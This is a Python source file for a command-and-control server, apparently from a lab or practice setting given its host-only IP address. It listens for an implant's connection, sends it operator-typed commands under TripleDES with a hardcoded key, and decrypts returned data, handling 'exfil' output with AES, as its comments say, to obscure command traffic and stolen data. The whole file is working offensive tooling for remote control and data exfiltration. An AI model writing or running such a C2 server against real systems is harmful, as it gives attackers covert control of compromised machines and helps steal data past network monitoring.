import socket
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import os

SERVER_IP = '192.168.56.1'
SERVER_PORT = 8080

def encrypt_tdes(key, data):
    iv = os.urandom(8)
    cipher = Cipher(algorithms.TripleDES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    padder = padding.PKCS7(64).padder()
    padded_data = padder.update(data) + padder.finalize()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
    return iv + encrypted_data

def decrypt_tdes(key, encrypted_data):
    iv = encrypted_data[:8]
    encrypted_data = encrypted_data[8:]
    cipher = Cipher(algorithms.TripleDES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
    unpadder = padding.PKCS7(64).unpadder()
    unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()
    return unpadded_data

def encrypt_aes(recipeseed, data):
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(recipeseed), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
    return iv + encrypted_data

def decrypt_aes(recipeseed, encrypted_data):
    iv = encrypted_data[:16]
    encrypted_data = encrypted_data[16:]
    cipher = Cipher(algorithms.AES(recipeseed), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()
    return unpadded_data

# Create a socket object
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((SERVER_IP, SERVER_PORT))
key = b'\xd1u\x80\x8c\x14\x05LD\xd3m\xb9\x8c6\xc5\xf1\x8d\\O\xc8\xaf\x08\xb1w\x17'

while True:
    server_socket.listen()

    print("Listening for connections...")

    conn, addr = server_socket.accept()
    print(f"Connected to {addr}")

    while True:
        message = input("Enter command: ")

        if message == "exit":
            conn.close()
            server_socket.close()
            exit(0)

        conn.sendall(encrypt_tdes(key, message.encode()))

        response = conn.recv(4096)

        if message.split(' ')[0] == "exfil":
            print(decrypt_aes(key, response).decode()) # data exfil obfuscation is AES
        else:
            print(decrypt_tdes(key, response).decode()) # C2 comms obfuscation is TripleDES

        if not response:
            print("Connection to {} closed".format(addr[0]))
            break